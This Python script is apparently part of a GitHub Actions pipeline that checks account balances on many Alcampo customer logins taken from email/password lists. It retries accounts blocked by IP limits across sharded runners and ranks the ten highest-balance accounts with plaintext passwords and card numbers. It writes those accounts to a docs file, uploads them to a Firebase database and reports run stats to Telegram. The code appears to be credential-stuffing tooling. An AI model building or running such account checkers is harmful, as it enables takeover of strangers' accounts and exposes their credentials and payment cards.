# @section: MergeAndRetry-Helpers

import sys
import os
import glob
import json
import re
import math
import argparse
import time
from datetime import datetime, timezone
import pandas as pd
import requests

sys.stdout.reconfigure(encoding='utf-8')
sys.stderr.reconfigure(encoding='utf-8')


def mask_email(email):
    if not email or "@" not in str(email):
        return "***"
    local, domain = str(email).split("@", 1)
    if len(local) <= 2:
        return f"{local[0]}***@{domain}"
    return f"{local[:2]}***{local[-1]}@{domain}"


def parse_args():
    parser = argparse.ArgumentParser(description="Merge and Retry Helper for Alcampo GitHub Actions Pipeline")
    parser.add_argument("--mode", choices=["check-timeouts", "final-merge"], required=True)
    parser.add_argument("--input-dir", default="./all_shards", help="Directory containing shard Excel files")
    parser.add_argument("--single-file", default=None, help="Inspect a specific single Excel file instead of a directory")
    parser.add_argument("--failed-json", default="failed_accounts.json", help="Path to write failed accounts JSON")
    parser.add_argument("--output-excel", default="REPORTE_DEFINITIVO_TELEGRAM.xlsx", help="Final output Excel path")
    return parser.parse_args()


def limpiar_saldo(saldo_str):
    if not saldo_str or pd.isna(saldo_str):
        return None
    texto = str(saldo_str)
    if "Error" in texto or "No encontrado" in texto:
        return None
    match = re.search(r"([0-9]+[.,][0-9]{2}|[0-9]+)", texto)
    if match:
        return float(match.group(0).replace(',', '.'))
    return None


def _sanitize_telegram_error(err, token=None):
    msg = type(err).__name__
    raw = str(err)
    if token and token in raw:
        raw = raw.replace(token, "***")
    raw = re.sub(r"bot\d+:[A-Za-z0-9_-]+", "bot***", raw)
    return f"{msg}: {raw[:140]}" if raw else msg


def enviar_telegram(token, chat_id, texto, excel_path=None):
    if not token or not chat_id:
        return False
    ok = True
    try:
        url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
        resp_msg = requests.post(
            url_msg,
            data={"chat_id": chat_id, "text": texto, "parse_mode": "HTML"},
            timeout=15
        )
        if not resp_msg.ok:
            print(f"⚠️ Telegram sendMessage devolvió HTTP {resp_msg.status_code}")
            ok = False
    except Exception as e:
        print(f"⚠️ Error enviando mensaje a Telegram ({_sanitize_telegram_error(e, token)})")
        ok = False

    if excel_path:
        if os.path.exists(excel_path):
            try:
                url_doc = f"https://api.telegram.org/bot{token}/sendDocument"
                with open(excel_path, "rb") as f:
                    resp_doc = requests.post(
                        url_doc,
                        data={"chat_id": chat_id, "caption": "📊 Reporte Maestro Consolidado de Saldos Alcampo"},
                        files={"document": f},
                        timeout=15
                    )
                if not resp_doc.ok:
                    print(f"⚠️ Telegram sendDocument devolvió HTTP {resp_doc.status_code}")
                    ok = False
            except Exception as e:
                print(f"⚠️ Error enviando documento a Telegram ({_sanitize_telegram_error(e, token)})")
                ok = False
        else:
            print(f"⚠️ Archivo adjunto no encontrado para Telegram: {os.path.basename(str(excel_path))}")
            ok = False

    if ok:
        print("🎉 Telegram notificado con éxito.")
    return ok

# @end: MergeAndRetry-Helpers


# @section: MergeAndRetry-Main

def main():
    args = parse_args()
    
    if args.mode == "check-timeouts":
        if args.single_file and os.path.exists(args.single_file):
            files = [args.single_file]
        else:
            files = glob.glob(os.path.join(args.input_dir, "**", "*.xlsx"), recursive=True)
        print(f"🔎 Inspeccionando {len(files)} archivo(s)...")
        
        failed_accounts = []
        seen_emails = set()
        for f in files:
            try:
                df = pd.read_excel(f)
                for _, row in df.iterrows():
                    email = str(row.get("email", "")).strip()
                    if not email or email in seen_emails:
                        continue
                    saldo = str(row.get("saldo", ""))
                    causa = str(row.get("causa_error", ""))
                    err_type = str(row.get("error_type", ""))
                    combined = f"{saldo} {causa} {err_type}".lower()

                    # Strictly exclude permanent account errors and needs_attention (Call Center / password reset)
                    if (
                        err_type in ("account_error", "needs_attention", "ok")
                        or "credenciales" in combined
                        or "incorrect" in combined
                        or "call center" in combined
                        or "bloqueada" in combined
                        or "btnpwreset" in combined
                        or "restablecer contraseña" in combined
                        or "tu saldo es" in combined
                    ):
                        continue

                    if (
                        err_type == "ip_error"
                        or "bloqueo/timeout" in combined
                        or "timeout" in combined
                        or "authenticationerror" in combined
                        or "no hidratado" in combined
                    ):
                        seen_emails.add(email)
                        failed_accounts.append({
                            "email": email,
                            "password": str(row["password"]).strip()
                        })
            except Exception as e:
                print(f"Error leyendo {f}: {e}")
                
        print(f"🔴 Cuentas elegibles para reintento por IP/Timeout: {len(failed_accounts)}")

        prev_history_file = "previous_failures.json"
        is_stagnant = False
        if len(failed_accounts) > 0 and os.path.exists(prev_history_file):
            try:
                with open(prev_history_file, "r", encoding="utf-8") as pf:
                    prev_data = json.load(pf)
                    prev_count = prev_data.get("count", 0)
                if len(failed_accounts) >= prev_count:
                    is_stagnant = True
                    print(f"⚠️ [EARLY EXIT] Los fallos no disminuyeron ({prev_count} → {len(failed_accounts)}). Abortando reintentos adicionales para proteger minutos de GitHub Actions.")
            except Exception as pe:
                print(f"Warning reading failure history: {pe}")

        if len(failed_accounts) > 0 and not is_stagnant:
            try:
                with open(prev_history_file, "w", encoding="utf-8") as pf:
                    json.dump({"count": len(failed_accounts)}, pf)
            except Exception:
                pass

        has_timeouts = "true" if (len(failed_accounts) > 0 and not is_stagnant) else "false"
        if len(failed_accounts) > 0 and not is_stagnant:
            with open(args.failed_json, "w", encoding="utf-8") as f:
                json.dump(failed_accounts, f, ensure_ascii=False, indent=2)
            print(f"💾 Cuentas fallidas guardadas en {args.failed_json}")
            
            prefix = (os.environ.get("FIREBASE_QUEUE_PREFIX") or "").strip()
            firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
            if firebase_url and os.environ.get("DISABLE_FIREBASE_SYNC") != "1":
                try:
                    fb_base = firebase_url.strip().rstrip("/")
                    requests.patch(f"{fb_base}/{prefix}progress.json", json={
                        "cycle": 2,
                        "retry_total": len(failed_accounts),
                        "is_finished": False
                    }, timeout=10)
                except Exception as fe:
                    print(f"Warning updating retry state in Firebase: {_sanitize_telegram_error(fe)}")
        else:
            if os.path.exists(args.failed_json):
                os.remove(args.failed_json)
            
        if "GITHUB_OUTPUT" in os.environ:
            with open(os.environ["GITHUB_OUTPUT"], "a", encoding="utf-8") as f:
                f.write(f"has_timeouts={has_timeouts}\n")
                f.write(f"failed_count={len(failed_accounts)}\n")

    elif args.mode == "final-merge":
        files = glob.glob(os.path.join(args.input_dir, "**", "*.xlsx"), recursive=True)
        print(f"📂 Archivos acumulados para consolidación final: {len(files)}")
        
        dfs = []
        shard_durations_min = []
        for f in files:
            try:
                df = pd.read_excel(f)
                if df.empty:
                    continue
                if "total_s" in df.columns:
                    # Estimate shard wall-clock duration (~2 threads per shard)
                    shard_sec = df["total_s"].fillna(0).sum() / 2.0 + 45.0
                    shard_durations_min.append(max(1, math.ceil(shard_sec / 60.0)))
                else:
                    shard_durations_min.append(9)

                filename = os.path.basename(f).lower()
                base_prio = 10
                if "cycle_" in filename:
                    try:
                        c_num = int(filename.split("cycle_")[1].split(".")[0].split("_")[0])
                        base_prio = 100 + c_num * 10
                    except Exception:
                        base_prio = 100
                elif "retry" in filename:
                    base_prio = 100

                prios = []
                for _, row in df.iterrows():
                    row_s = str(row.get("saldo", ""))
                    if "Tu Saldo es" in row_s:
                        prios.append(base_prio + 1000)
                    else:
                        prios.append(base_prio)
                df["_priority"] = prios
                dfs.append(df)
            except Exception as e:
                print(f"Error leyendo {f}: {e}")
                
        if not dfs:
            print("❌ No se encontraron archivos con datos para consolidar.")
            return

        df_all = pd.concat(dfs, ignore_index=True)
        df_all.sort_values(by=["_priority"], inplace=True)
        df_all.drop_duplicates(subset=["email"], keep="last", inplace=True)
        df_all.drop(columns=["_priority"], errors="ignore", inplace=True)
        
        df_success = df_all[df_all["saldo"].astype(str).str.contains("Tu Saldo es", na=False)].copy()
        df_callcenter = df_all[df_all["saldo"].astype(str).str.contains("Call Center|bloqueada|btnPwReset|restablecer", na=False, regex=True)].copy()
        df_errors = df_all[~df_all["email"].isin(df_success["email"]) & ~df_all["email"].isin(df_callcenter["email"])].copy()

        with pd.ExcelWriter(args.output_excel, engine="openpyxl") as writer:
            df_all.to_excel(writer, sheet_name="Todas las Cuentas", index=False)
            df_success.to_excel(writer, sheet_name="Exitosas con Saldo", index=False)
            df_callcenter.to_excel(writer, sheet_name="Bloqueadas Call Center", index=False)
            df_errors.to_excel(writer, sheet_name="Errores Credenciales y Red", index=False)

        print(f"💾 Reporte consolidado final guardado en {args.output_excel}")
        
        total = len(df_all)
        saldo_total = 0.0
        cuentas_dinero = 0
        cuentas_cero = 0
        cuentas_attention = len(df_callcenter)
        cuentas_error = len(df_errors) + cuentas_attention
        ranked = []
        top_10_json = []

        for _, row in df_success.iterrows():
            val = limpiar_saldo(row.get("saldo"))
            if val is not None:
                saldo_total += val
                email = str(row.get("email", "")).strip()
                password = str(row.get("password", "")).strip()
                card_num = row.get("card_number") if "card_number" in row else row.get("tarjeta") if "tarjeta" in row else None
                card_str = str(card_num).strip() if (card_num and not pd.isna(card_num)) else None
                
                if val > 0:
                    cuentas_dinero += 1
                    ranked.append((val, email, password, card_str))
                else:
                    cuentas_cero += 1

        ranked.sort(key=lambda x: x[0], reverse=True)
        top_10 = ranked[:10]

        for val, email, password, card_str in top_10:
            top_10_json.append({
                "email": email,
                "password": password,
                "balance": round(val, 2),
                "card_number": card_str
            })

        prefix = (os.environ.get("FIREBASE_QUEUE_PREFIX") or "").strip()
        test_limit_env = (os.environ.get("TEST_LIMIT") or "").strip()
        is_test_run = bool(prefix or test_limit_env)

        docs_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "docs"))
        history_path = os.path.join(docs_dir, "history.json") if os.path.exists(docs_dir) else "history.json"
        history_data = []
        if os.path.exists(history_path):
            try:
                with open(history_path, "r", encoding="utf-8") as hf:
                    history_data = json.load(hf)
                    if not isinstance(history_data, list):
                        history_data = []
            except Exception:
                history_data = []

        successes = cuentas_dinero + cuentas_cero
        success_rate = (successes / total * 100) if total > 0 else 0.0
        avg_s = float(df_all["total_s"].dropna().mean()) if "total_s" in df_all.columns and not df_all["total_s"].dropna().empty else 13.1
        p95_s = float(df_all["total_s"].dropna().quantile(0.95)) if "total_s" in df_all.columns and not df_all["total_s"].dropna().empty else 16.5
        # Add overhead for prepare (1m) + check-timeouts (1m) + final-consolidate (1m)
        estimated_billed_min = sum(shard_durations_min) + 3

        now_utc = datetime.now(timezone.utc)
        current_ym = now_utc.strftime("%Y-%m")

        if not is_test_run:
            with open("top_accounts.json", "w", encoding="utf-8") as tf:
                json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

            if os.path.exists(docs_dir):
                with open(os.path.join(docs_dir, "top_accounts.json"), "w", encoding="utf-8") as tf:
                    json.dump(top_10_json, tf, ensure_ascii=False, indent=2)

            next_id = 1
            if history_data:
                next_id = max([e.get("id", 0) for e in history_data if isinstance(e, dict)] or [0]) + 1

            new_history_entry = {
                "id": next_id,
                "date": now_utc.isoformat(),
                "version": "Multi-VM Matrix 2-Pass v2.1",
                "duration": round(avg_s * total / max(1, len(files) * 2), 1),
                "checked": total,
                "success": successes,
                "zero": cuentas_cero,
                "error": cuentas_error,
                "needs_attention": cuentas_attention,
                "success_rate": round(success_rate, 2),
                "total_balance": round(saldo_total, 2),
                "estimated_actions_minutes": estimated_billed_min
            }
            history_data.append(new_history_entry)

            with open(history_path, "w", encoding="utf-8") as hf:
                json.dump(history_data, hf, ensure_ascii=False, indent=4)
        else:
            print("🧪 [MODO TEST] Omitiendo actualización de docs/history.json, top_accounts.json y acumulado mensual.")

        monthly_accumulated_min = sum(
            int(e.get("estimated_actions_minutes") or math.ceil(float(e.get("duration") or 0) / 60.0 * 7) + 3)
            for e in history_data
            if isinstance(e, dict) and str(e.get("date", "")).startswith(current_ym)
        )

        # Write GitHub Step Summary ($GITHUB_STEP_SUMMARY) without exposing accounts, passwords, or balances
        if "GITHUB_STEP_SUMMARY" in os.environ:
            try:
                mode_tag = " [MODO TEST]" if is_test_run else ""
                quota_row = (
                    f"| **Minutos Acumulados del Mes ({current_ym})** | *Sin cambios en modo test (~{monthly_accumulated_min} / 2.000 min)* |\n"
                    if is_test_run else
                    f"| **Minutos Acumulados del Mes ({current_ym})** | **~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)** |\n"
                )
                summary_md = (
                    f"## 📊 Resumen Consolidado Alcampo Scraper (v2.1){mode_tag}\n\n"
                    f"| Métrica | Valor |\n"
                    f"| :--- | :--- |\n"
                    f"| **Cuentas Procesadas** | {total} |\n"
                    f"| **Exitosas (`OK`)** | {successes} ({success_rate:.1f}%) |\n"
                    f"| **Requieren Atención (`needs_attention`)** | {cuentas_attention} (Call Center / Reset) |\n"
                    f"| **Otros Errores (`account_error` / `ip_error`)** | {len(df_errors)} |\n"
                    f"| **Tiempo Medio / p95 por Cuenta** | {avg_s:.2f} s / {p95_s:.2f} s |\n"
                    f"| **Minutos Facturados Estimados (Ejecución)** | ~{estimated_billed_min} min (Jobs: {len(files)} shards + 3 aux) |\n"
                    f"{quota_row}"
                )
                with open(os.environ["GITHUB_STEP_SUMMARY"], "a", encoding="utf-8") as sf:
                    sf.write(summary_md)
            except Exception as se:
                print(f"Warning writing GITHUB_STEP_SUMMARY: {se}")

        firebase_url = os.environ.get("FIREBASE_DB_URL") or "https://monitor-alcampo-default-rtdb.europe-west1.firebasedatabase.app/"
        if firebase_url and not is_test_run and os.environ.get("DISABLE_FIREBASE_SYNC") != "1":
            try:
                fb_base = firebase_url.strip().rstrip("/")
                requests.put(f"{fb_base}/top_accounts.json", json=top_10_json, timeout=10)
                requests.put(f"{fb_base}/history.json", json=history_data, timeout=10)
                
                prog_snap = {
                    "total": total,
                    "processed": total,
                    "success": successes,
                    "money": cuentas_dinero,
                    "zero": cuentas_cero,
                    "error": cuentas_error,
                    "total_balance": round(saldo_total, 2),
                    "is_finished": True,
                    "timestamp": time.time()
                }
                requests.put(f"{fb_base}/progress.json", json=prog_snap, timeout=10)
                print("✔ [FIREBASE] Sincronización exitosa de /top_accounts.json, /history.json y /progress.json")
            except Exception as fe:
                print(f"⚠️ Error al sincronizar con Firebase: {_sanitize_telegram_error(fe)}")

        mode_label = " [TEST]" if is_test_run else ""
        quota_line = (
            f"⚙️ Minutos ejecución test: ~{estimated_billed_min} min (acumulado mensual no modificado)"
            if is_test_run else
            f"⚙️ Minutos Actions: ~{estimated_billed_min} min (Mes {current_ym}: ~{monthly_accumulated_min}/2.000 min, {monthly_accumulated_min / 20.0:.1f}%)"
        )
        msg = (
            f"📊 <b>RESUMEN EJECUCIÓN ALCAMPO (v2.1){mode_label}</b>\n\n"
            f"✅ Procesadas: {total} | OK: {successes} ({success_rate:.1f}%)\n"
            f"⚠️ Atención (`needs_attention`): {cuentas_attention} | Otros errores: {len(df_errors)}\n"
            f"⏱️ Ritmo: {avg_s:.1f}s/cta (p95: {p95_s:.1f}s)\n"
            f"{quota_line}"
        )

        token = os.environ.get("TELEGRAM_TOKEN")
        chat_id = os.environ.get("TELEGRAM_CHAT_ID")
        if token and chat_id:
            try:
                enviar_telegram(token, chat_id, msg)
            except Exception as e:
                print(f"⚠️ Error no bloqueante enviando resumen a Telegram ({_sanitize_telegram_error(e, token)})")

            if not is_test_run:
                try:
                    if monthly_accumulated_min >= 1900:
                        quota_alert = (
                            f"🚨 <b>AVISO DE CUOTA CRÍTICA GITHUB ACTIONS (~100%)</b>\n\n"
                            f"• Mes: <code>{current_ym}</code>\n"
                            f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
                            f"• La ejecución diaria continúa según lo configurado (si GitHub agota la cuota, la cola quedará lista para el siguiente ciclo)."
                        )
                        enviar_telegram(token, chat_id, quota_alert)
                    elif monthly_accumulated_min > 1700:
                        quota_warn = (
                            f"⚠️ <b>AVISO DE CUOTA GITHUB ACTIONS (&gt;85%)</b>\n\n"
                            f"• Mes: <code>{current_ym}</code>\n"
                            f"• Consumo acumulado estimado: <b>~{monthly_accumulated_min} / 2.000 min ({monthly_accumulated_min / 20.0:.1f}%)</b>\n"
                            f"• La ejecución diaria se mantiene activa."
                        )
                        enviar_telegram(token, chat_id, quota_warn)
                except Exception as e:
                    print(f"⚠️ Error no bloqueante enviando aviso de cuota a Telegram ({_sanitize_telegram_error(e, token)})")

# @end: MergeAndRetry-Main

if __name__ == "__main__":
    main()

